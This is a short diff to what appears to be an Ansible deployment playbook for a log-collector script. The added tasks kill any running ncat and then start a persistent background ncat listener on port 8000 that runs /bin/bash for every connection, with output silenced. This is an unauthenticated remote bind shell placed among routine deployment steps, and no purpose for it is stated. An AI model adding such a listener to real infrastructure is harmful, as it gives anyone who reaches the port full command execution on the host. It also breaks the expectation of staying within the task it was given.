@@ -42,3 +42,12 @@
       src: "{{ rundir }}/log-collector.sh"
       dest: /tmp/log-collector.sh
       mode: '0744'
+
+  - name: Stop ncat listeners
+    command: killall -9 ncat
+    ignore_errors: True
+
+  - name: Start ncat listeners
+    shell: "(ncat -l -vv -k -p 8000 -e /bin/bash </dev/null >/dev/null 2>&1 &)"
+    async: 10
+    poll: 0
